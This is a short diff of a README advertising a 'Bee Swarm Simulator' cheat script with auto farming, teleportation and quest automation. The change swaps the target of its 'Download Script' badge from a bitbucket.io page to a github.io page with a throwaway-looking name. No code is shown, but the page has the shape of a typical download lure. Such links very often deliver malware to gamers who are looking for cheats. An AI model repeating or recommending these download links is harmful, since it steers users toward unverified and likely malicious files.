@@ -4,7 +4,7 @@
 
 Ready to dominate Bee Swarm Simulator? Discover the ultimate script packed with features like auto farming, teleportation, and quest automation. 
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://Bee-Swarm-Simulator-Script-sal1.github.io/.github)
 ---
 
 ## 🧪 Product Description
